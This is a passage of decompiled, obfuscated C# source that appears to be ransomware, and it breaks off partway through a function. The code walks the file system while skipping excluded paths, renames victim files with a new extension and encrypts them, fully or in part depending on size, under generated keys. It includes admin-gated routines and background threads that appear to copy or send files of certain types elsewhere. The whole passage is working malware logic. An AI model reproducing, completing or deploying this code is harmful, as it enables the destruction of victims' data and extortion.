using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using LKDFotCmhcU;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using oFbodOYJTt;

namespace frgoWklvEOSV;

internal sealed class GRQFeQGQfBG
{
	public sealed class RAjgPCVHZF
	{
		private static StringCollection rKTaPFzOWa;

		private static List<string> KgTnddVGDKK;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107403156));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107403183)) && !text.ToLower().Contains(getString_0(107403130)) && !text.ToLower().Contains(getString_0(107388158)) && !text.ToLower().Contains(getString_0(107388177)) && !text.ToLower().Contains(getString_0(107403149)) && !text.ToLower().Contains(getString_0(107388509)) && !text.ToLower().Contains(getString_0(107388450)) && !text.ToLower().Contains(getString_0(107388465)) && !text.ToLower().Contains(getString_0(107388416)) && !text.ToLower().Contains(getString_0(107388431)) && !text.ToLower().Contains(getString_0(107388397)) && !text.ToLower().Contains(getString_0(107388348)) && !text.ToLower().Contains(getString_0(107388363)) && !text.ToLower().Contains(getString_0(107388318)) && !text.ToLower().Contains(getString_0(107388329)) && !text.ToLower().Contains(getString_0(107388284)) && !text.ToLower().Contains(getString_0(107388303)) && !text.ToLower().Contains(getString_0(107387742)) && !text.ToLower().Contains(getString_0(107387757)) && !text.Contains(PhXjLAIdTCy(getString_0(107387708))) && !text.Contains(getString_0(107387683)) && !text.Contains(getString_0(107387670)) && !text.EndsWith(getString_0(107395234)) && !text.EndsWith(getString_0(107387645)) && !text.EndsWith(getString_0(107387640)) && !text.EndsWith(getString_0(107387667)) && !text.EndsWith(getString_0(107387662)) && !text.ToLower().Contains(getString_0(107387657)) && !text.ToLower().Contains(LIbWxYpDOmPy))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(cJvZgRMCiiT) * 1024.0 * 1024.0 && kvJFoDYMuC == getString_0(107396839))
							{
								KgTnddVGDKK.Add(text);
							}
							else if (File.Exists(text) && kvJFoDYMuC == getString_0(107396999))
							{
								KgTnddVGDKK.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return KgTnddVGDKK;
		}

		static RAjgPCVHZF()
		{
			Strings.CreateGetStringDelegate(typeof(RAjgPCVHZF));
			rKTaPFzOWa = new StringCollection();
			KgTnddVGDKK = new List<string>();
		}
	}

	private sealed class dkdfdmXmxAk
	{
		public string sZxLlvESUzLZXKq;

		public bool _003CMain_003Eb__6(Process process_0)
		{
			return process_0.ProcessName == sZxLlvESUzLZXKq;
		}
	}

	private sealed class OjfhzFWYFdyA
	{
		public string[] JNtjaLfncUVSAvQ;

		public void _003CMain_003Eb__7()
		{
			YAxWDMRBAqs.uxfwPrDKmXAM(JNtjaLfncUVSAvQ);
		}
	}

	private sealed class srrHuxcqQLoZC
	{
		public string PWgItyVYDrnlaJwQf;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1d(int int_0)
		{
			Thread.Sleep(rHOZvgFGaXKMdexR);
			HoHveMjVjvX.Add(getString_0(107387559) + PWgItyVYDrnlaJwQf + getString_0(107397116) + (char)int_0 + getString_0(107402592));
			try
			{
				if (qoRjYABduZF)
				{
					Console.WriteLine(getString_0(107387559) + PWgItyVYDrnlaJwQf + getString_0(107397116) + (char)int_0 + getString_0(107402592));
				}
			}
			catch
			{
			}
		}

		static srrHuxcqQLoZC()
		{
			Strings.CreateGetStringDelegate(typeof(srrHuxcqQLoZC));
		}
	}

	private sealed class hVxHXOomQHkJx
	{
		private sealed class LhmuMiwbEJnjfZN
		{
			public hVxHXOomQHkJx oawEYUfXgfBQ;

			public string NyPtOimZdkEdllM;

			public void _003CCrypt_003Eb__29()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					WZXZsPCXUvqpx(WindowsIdentity.GetCurrent().Name, NyPtOimZdkEdllM);
				}
			}

			public void _003CCrypt_003Eb__2a()
			{
				cldnMztlbqne(NyPtOimZdkEdllM, oawEYUfXgfBQ.gEhXXIzChk, oawEYUfXgfBQ.sZqoWBfJdvFIl, oawEYUfXgfBQ.WLgJdVMBruB, oawEYUfXgfBQ.wxfrhJHvjWjHlu);
			}
		}

		public string[] gEhXXIzChk;

		public string[] WLgJdVMBruB;

		public string wxfrhJHvjWjHlu;

		public string sZqoWBfJdvFIl;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__28(string string_0)
		{
			LhmuMiwbEJnjfZN CS_0024_003C_003E8__locals0 = new LhmuMiwbEJnjfZN();
			CS_0024_003C_003E8__locals0.oawEYUfXgfBQ = this;
			CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM = string_0;
			if (upflSQRmeWP && !ProlBhJTlUdn().Contains(getString_0(107385974)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						WZXZsPCXUvqpx(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (iEHeKlEPYHGI == getString_0(107396848))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					cldnMztlbqne(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.gEhXXIzChk, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.WLgJdVMBruB, CS_0024_003C_003E8__locals0.oawEYUfXgfBQ.wxfrhJHvjWjHlu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				cldnMztlbqne(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, gEhXXIzChk, sZqoWBfJdvFIl, WLgJdVMBruB, wxfrhJHvjWjHlu);
			}
		}

		static hVxHXOomQHkJx()
		{
			Strings.CreateGetStringDelegate(typeof(hVxHXOomQHkJx));
		}
	}

	private sealed class YUIjdATTEVIX
	{
		private sealed class FjPMVmyEERNReE
		{
			public YUIjdATTEVIX OpthSnzYEubqcgNg;

			public string JqgYVVMwzVoNzX;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__36()
			{
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (JqgYVVMwzVoNzX.ToLower().EndsWith(item + OpthSnzYEubqcgNg.ZDxRrpKTbd) && vEWBFQaTPDgk == getString_0(107396859))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(JqgYVVMwzVoNzX).Length)
						{
							try
							{
								LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388627), getString_0(107388622), getString_0(107388641), JqgYVVMwzVoNzX);
							}
							catch
							{
							}
						}
					}
					else if (JqgYVVMwzVoNzX.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397019))
					{
						try
						{
							LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388627), getString_0(107388622), getString_0(107388641), JqgYVVMwzVoNzX);
						}
						catch
						{
						}
					}
				}
			}

			static FjPMVmyEERNReE()
			{
				Strings.CreateGetStringDelegate(typeof(FjPMVmyEERNReE));
			}
		}

		private sealed class dAvOkiJbjzoXh
		{
			public YUIjdATTEVIX OpthSnzYEubqcgNg;

			public string PUDDzPYRoE;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (PUDDzPYRoE.ToLower().EndsWith(item + OpthSnzYEubqcgNg.ZDxRrpKTbd) && vEWBFQaTPDgk == getString_0(107396862))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(PUDDzPYRoE).Length)
						{
							try
							{
								LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388630), getString_0(107388625), getString_0(107388644), PUDDzPYRoE);
							}
							catch
							{
							}
						}
					}
					else if (PUDDzPYRoE.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107397022))
					{
						try
						{
							LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388630), getString_0(107388625), getString_0(107388644), PUDDzPYRoE);
						}
						catch
						{
						}
					}
				}
			}

			static dAvOkiJbjzoXh()
			{
				Strings.CreateGetStringDelegate(typeof(dAvOkiJbjzoXh));
			}
		}

		public List<string> ZfHQdOmNHVP;

		public List<string> WNvdcTPDgW;

		public string ZDxRrpKTbd;

		public string[] dXgeOiXUaNyFEW;

		public string nyAmnOdcSzzfJ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__35(string string_0)
		{
			FjPMVmyEERNReE CS_0024_003C_003E8__locals0;
			foreach (string item in WNvdcTPDgW)
			{
				if (dXgeOiXUaNyFEW.Length != 0)
				{
					string[] array = dXgeOiXUaNyFEW;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09e1;
					}
				}
				try
				{
					if (item.EndsWith(ZDxRrpKTbd))
					{
						goto IL_09e1;
					}
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				if (!item.EndsWith(string_0) || yGkMwQPqUdXIj.Contains(item))
				{
					continue;
				}
				if (cySCSfjuDKIn == getString_0(107396856))
				{
					try
					{
						if (femjyBXnUNA.ngUKfMrzBNU(item))
						{
							femjyBXnUNA.rVIDVvPdlEIDhn(item);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(item);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
				}
				opWbnDRtWCXNbKkM(item);
				try
				{
					new CQyeXvaAck().qKRkxhexZuqHsOh(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(getString_0(107402600) + item + getString_0(107402587) + new FileInfo(item).Length + getString_0(107402534));
								Console.WriteLine(getString_0(107402557));
							}
						}
						catch
						{
						}
						tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107402420)), getString_0(107387558) + item + getString_0(107387558) + PhXjLAIdTCy(getString_0(107402427)) + getString_0(107387558) + Environment.UserName + getString_0(107387558) + PhXjLAIdTCy(getString_0(107402378)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + item + getString_0(107402865) + ex2.Message + getString_0(107396257));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + item + getString_0(107402816) + ex4.Message + getString_0(107396257));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_02cd;
					}
					if (CdQMIPJOkrOUDSy == getString_0(107396856) && new FileInfo(item).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 && !ZfHQdOmNHVP.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new FjPMVmyEERNReE();
						CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg = this;
						try
						{
							if (ZDxRrpKTbd != getString_0(107385855))
							{
								if (MiZHZrKmtKkaPXn)
								{
									ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
								}
								File.Move(item, item + ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + item + getString_0(107402755) + ex6.Message + getString_0(107396257));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = getString_0(107388575);
						if (ZDxRrpKTbd != getString_0(107385855))
						{
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item + ZDxRrpKTbd;
						}
						else
						{
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item;
						}
						if (bxhZXFvKXZl == getString_0(107396856))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg.ZDxRrpKTbd) && vEWBFQaTPDgk == FjPMVmyEERNReE.getString_0(107396859))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX).Length)
										{
											try
											{
												LRKYNOUdGHN.qatkvmOGuIr(FjPMVmyEERNReE.getString_0(107388627), FjPMVmyEERNReE.getString_0(107388622), FjPMVmyEERNReE.getString_0(107388641), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2) && vEWBFQaTPDgk == FjPMVmyEERNReE.getString_0(107397019))
									{
										try
										{
											LRKYNOUdGHN.qatkvmOGuIr(FjPMVmyEERNReE.getString_0(107388627), FjPMVmyEERNReE.getString_0(107388622), FjPMVmyEERNReE.getString_0(107388641), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = mceVbtNuaiZN.aqouYfCyYVRJ(32);
						string s = fFCYpdPapHY.lDIEEniZHqoT(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == getString_0(107397016))
						{
							byte[] array2 = null;
							byte[] byte_ = RgELsEgHUCW.yawJYYjGarh(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (RgELsEgHUCW.UWMgjLGhgbOURXn(kSmujIomiIqp: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), VBvOCDljtLw: CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, dJYcPbfWMdc: bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, nyAmnOdcSzzfJ))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, text, bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (MiZHZrKmtKkaPXn)
					{
						ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
					}
					string text2 = mceVbtNuaiZN.aqouYfCyYVRJ(32);
					string s2 = fFCYpdPapHY.lDIEEniZHqoT(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (ZDxRrpKTbd != getString_0(107385855))
					{
						if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								ruDoXmaKIFHJl(item, item + ZDxRrpKTbd, lrVhqMPbYlaOK);
							}
							else
							{
								ruDoXmaKIFHJl(item, item + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									NjEZcsaMnUwQ(item, item + ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									NjEZcsaMnUwQ(item, item + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + item + getString_0(107385809) + ex11.Message + getString_0(107396257));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								try
								{
									File.Move(item + ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!EcdpqbMrQOzfdgL)
					{
						if (!IooTTsvIiwCN)
						{
							ruDoXmaKIFHJl(item, item + getString_0(107385850), lrVhqMPbYlaOK);
						}
						else
						{
							ruDoXmaKIFHJl(item, item + getString_0(107385850), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!IooTTsvIiwCN)
							{
								NjEZcsaMnUwQ(item, item, lrVhqMPbYlaOK);
							}
							else
							{
								NjEZcsaMnUwQ(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + item + getString_0(107385809) + ex14.Message + getString_0(107396257));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							goto end_IL_02cd;
						}
					}
					if (IooTTsvIiwCN)
					{
						if (ZDxRrpKTbd != getString_0(107385855))
						{
							ixTFoaDRJMY(item + ZDxRrpKTbd, bytes2);
						}
						else
						{
							ixTFoaDRJMY(item, bytes2);
						}
					}
					goto IL_09e1;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				continue;
				IL_09e1:
				WNvdcTPDgW.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__37(string string_0)
		{
			dAvOkiJbjzoXh CS_0024_003C_003E8__locals0 = new dAvOkiJbjzoXh();
			CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg = this;
			CS_0024_003C_003E8__locals0.PUDDzPYRoE = string_0;
			if (dXgeOiXUaNyFEW.Length != 0)
			{
				string[] array = dXgeOiXUaNyFEW;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(ZDxRrpKTbd))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!yGkMwQPqUdXIj.Contains(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
			{
				if (cySCSfjuDKIn == getString_0(107396856))
				{
					try
					{
						if (femjyBXnUNA.ngUKfMrzBNU(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
						{
							femjyBXnUNA.rVIDVvPdlEIDhn(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE));
				}
				opWbnDRtWCXNbKkM(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				try
				{
					new CQyeXvaAck().qKRkxhexZuqHsOh(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.PUDDzPYRoE, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(getString_0(107402600) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107402587) + new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length + getString_0(107402534));
								Console.WriteLine(getString_0(107402557));
							}
						}
						catch
						{
						}
						tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107402420)), getString_0(107387558) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107387558) + PhXjLAIdTCy(getString_0(107402427)) + getString_0(107387558) + Environment.UserName + getString_0(107387558) + PhXjLAIdTCy(getString_0(107402378)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107402865) + ex2.Message + getString_0(107396257));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107402816) + ex4.Message + getString_0(107396257));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_031d_2;
					}
					if (CdQMIPJOkrOUDSy == getString_0(107396856) && new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024)
					{
						try
						{
							if (ZDxRrpKTbd != getString_0(107385855))
							{
								if (MiZHZrKmtKkaPXn)
								{
									ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
								}
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107402755) + ex6.Message + getString_0(107396257));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							return;
						}
						if (ZDxRrpKTbd != getString_0(107385855))
						{
							CS_0024_003C_003E8__locals0.PUDDzPYRoE += ZDxRrpKTbd;
						}
						if (bxhZXFvKXZl == getString_0(107396856))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.OpthSnzYEubqcgNg.ZDxRrpKTbd) && vEWBFQaTPDgk == dAvOkiJbjzoXh.getString_0(107396862))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length)
										{
											try
											{
												LRKYNOUdGHN.qatkvmOGuIr(dAvOkiJbjzoXh.getString_0(107388630), dAvOkiJbjzoXh.getString_0(107388625), dAvOkiJbjzoXh.getString_0(107388644), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item) && vEWBFQaTPDgk == dAvOkiJbjzoXh.getString_0(107397022))
									{
										try
										{
											LRKYNOUdGHN.qatkvmOGuIr(dAvOkiJbjzoXh.getString_0(107388630), dAvOkiJbjzoXh.getString_0(107388625), dAvOkiJbjzoXh.getString_0(107388644), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = mceVbtNuaiZN.aqouYfCyYVRJ(32);
						string s = fFCYpdPapHY.lDIEEniZHqoT(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == getString_0(107397016))
						{
							byte[] array2 = null;
							byte[] byte_ = RgELsEgHUCW.yawJYYjGarh(CS_0024_003C_003E8__locals0.PUDDzPYRoE, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (!RgELsEgHUCW.UWMgjLGhgbOURXn(kSmujIomiIqp: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), VBvOCDljtLw: CS_0024_003C_003E8__locals0.PUDDzPYRoE, dJYcPbfWMdc: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (!sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, nyAmnOdcSzzfJ))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!sRurvpLEXXDXV.tTUpQRykitgwWL(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MiZHZrKmtKkaPXn)
						{
							ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
						}
						string text2 = mceVbtNuaiZN.aqouYfCyYVRJ(32);
						string s2 = fFCYpdPapHY.lDIEEniZHqoT(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (ZDxRrpKTbd != getString_0(107385855))
						{
							if (!EcdpqbMrQOzfdgL)
							{
								if (!IooTTsvIiwCN)
								{
									ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IooTTsvIiwCN)
									{
										NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, lrVhqMPbYlaOK);
									}
									else
									{
										NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (joesCNAxeHUI)
									{
										try
										{
